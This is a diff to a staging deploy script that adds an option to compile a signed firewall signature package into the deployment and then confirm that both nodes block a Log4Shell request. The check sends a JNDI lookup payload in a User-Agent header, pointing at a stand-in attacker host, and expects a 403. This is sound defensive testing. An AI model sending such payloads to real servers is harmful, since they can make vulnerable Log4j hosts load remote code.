@@ -11,9 +11,15 @@
 # are tagged with the release, passwords and data stay in
 # deploy/staging/.state and the strata-staging volumes across deploys.
 #
-# Usage: deploy/staging/deploy.sh <tag>          deploy (build, up, smoke)
-#        deploy/staging/deploy.sh --check <tag>  only the checks on the tag
-#        deploy/staging/deploy.sh --status       what is deployed
+# With --signatures <package dir> (W09-S-01), the control plane of staging
+# compiles that signature package (strata-rules release, checked against
+# rules/release/signatures.pub) into every bundle instead of the lab's
+# sample rules, and the policies are deployed again so that the nodes run
+# it; a request only the package blocks (Log4Shell, 700001) checks that.
+#
+# Usage: deploy/staging/deploy.sh [--signatures <dir>] <tag>   deploy (build, up, smoke)
+#        deploy/staging/deploy.sh --check <tag>                only the checks on the tag
+#        deploy/staging/deploy.sh --status                     what is deployed
 set -euo pipefail
 here="$(cd "$(dirname "$0")" && pwd)"
 root="$(cd "$here/../.." && pwd)"
@@ -26,8 +32,9 @@ if [ "${1:-}" = "--status" ]; then
     cat "$state/deployed" 2>/dev/null || echo "staging: nothing deployed"
     exit 0
 fi
-check_only=0
+check_only=0 sigs=""
 if [ "${1:-}" = "--check" ]; then check_only=1; shift; fi
+if [ "${1:-}" = "--signatures" ]; then sigs="$(cd "${2:?--signatures <package dir>}" && pwd)"; shift 2; fi
 tag="${1:-}"
 [ -n "$tag" ] || die "usage: deploy.sh [--check] <tag>"
 
@@ -46,6 +53,17 @@ remote_commit=$(awk -v t="refs/tags/$tag" '$2 == t "^{}" { c = $1 } $2 == t && c
 echo "staging: $tag = $local_commit (on $remote)"
 [ "$check_only" = 1 ] && exit 0
 
+# 1b. the signature package: its manifest signed by the release key, and
+# every file as the manifest says
+if [ -n "$sigs" ]; then
+    rel="${sigs#"$root"/}"
+    [ "$rel" != "$sigs" ] || die "the signature package must be under the repository ($root)"
+    (cd "$root" && deploy/dev/run.sh sh -c "cd tools/strata-rules && go run . verify --pub ../../rules/release/signatures.pub ../../$rel") \
+        || die "signature package $sigs does not verify"
+    sig_ir=$(ls "$sigs"/*.rules.json)
+    sig_version=$(sed -n 's/.*"version": *"\([^"]*\)".*/\1/p' "$sigs/manifest.json" | head -1)
+fi
+
 # 2. the sources of the tag, and the build from them
 src="$root/build/staging/$tag"
 rm -rf "$src" && mkdir -p "$src"
@@ -63,6 +81,14 @@ for f in compose.yaml smoke.sh keycloak/strata-realm.json; do
         "$lab/$f"
 done
 grep -q '^name: strata-staging$' "$lab/compose.yaml" || die "compose.yaml of $tag has no project name to rewrite"
+if [ -n "$sigs" ]; then
+    # the package's IR in the runtime image, as the control plane's rules;
+    # its cost units are those of 9,000 rules (see docs/reports/w09-s-01.md)
+    cp "$sig_ir" "$src/build/lab/dist/signatures.rules.json"
+    sed -i 's|^COPY rules.yaml |COPY rules.yaml signatures.rules.json |' "$src/build/lab/dist/Dockerfile"
+    sed -i -e "s|- -rules=/opt/strata/rules.yaml|- -rules=/opt/strata/signatures.rules.json\n      - -cost-budget=${STAGING_COST_BUDGET:-2000000}|" "$lab/compose.yaml"
+    grep -q 'signatures.rules.json' "$lab/compose.yaml" || die "compose.yaml of $tag has no -rules flag to point at the package"
+fi
 mkdir -p "$state"
 rm -rf "$lab/.state" && ln -s "$state" "$lab/.state"
 "$lab/init-env.sh" # once: staging passwords, kept across deploys
@@ -72,5 +98,35 @@ compose=(docker compose -f "$lab/compose.yaml" --env-file "$state/env")
 
 # 4. what is deployed, then the lab smoke test against it
 printf 'tag=%s\ncommit=%s\ndeployed_at=%s\n' "$tag" "$local_commit" "$(date -u +%FT%TZ)" > "$state/deployed"
+[ -n "$sigs" ] && printf 'signatures=%s\nsignatures_sha256=%s\n' "$sig_version" "$(sha256sum "$sig_ir" | cut -d' ' -f1)" >> "$state/deployed"
 "$lab/smoke.sh"
+if [ -n "$sigs" ]; then
+    # the policies again, compiled with the package; then a request only
+    # the package blocks
+    # shellcheck disable=SC1091
+    . "$state/env"
+    token=$(curl -fsS http://127.0.0.1:28180/realms/strata/protocol/openid-connect/token \
+        -d grant_type=password -d client_id=strata-lab-cli -d "client_secret=$LAB_CLI_SECRET" \
+        -d username=lab-operator --data-urlencode "password=$LAB_OPERATOR_PASSWORD" |
+        sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
+    [ -n "$token" ] || die "no token for lab-operator"
+    api() { curl -fsS -H "Authorization: Bearer $token" -H 'Content-Type: application/json' "$@"; }
+    field() { grep -o "\"$1\":\"[^\"]*\"" | head -1 | sed 's/.*:"\(.*\)"/\1/'; }
+    for p in example-api example-web; do
+        out=$(api -X POST http://127.0.0.1:28090/v1/policies/$p:deploy -d '{}') || die "deploy $p: $out"
+        rollout=$(field rollout_id <<<"$out")
+        echo "staging: $p deployed with signatures $sig_version (bundle $(field version <<<"$out"), rollout $rollout)"
+        start=$SECONDS
+        until st=$(api "http://127.0.0.1:28090/v1/rollouts/$rollout" | field state) && [ "$st" = DONE ]; do
+            [ "$st" = FAILED ] && die "rollout $rollout failed"
+            [ $((SECONDS - start)) -lt 300 ] || die "rollout $rollout not done in 300 s (state $st)"
+            sleep 2
+        done
+    done
+    for port in 28080 28081; do
+        code=$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: api.example.test' -H 'User-Agent: ${jndi:ldap://attacker.example.test/a}' "http://127.0.0.1:$port/")
+        [ "$code" = 403 ] || die "node :$port does not block a Log4Shell probe (got $code): it does not run the package"
+    done
+    echo "staging: both nodes run signatures $sig_version (Log4Shell probe blocked)"
+fi
 echo "staging: $tag deployed"
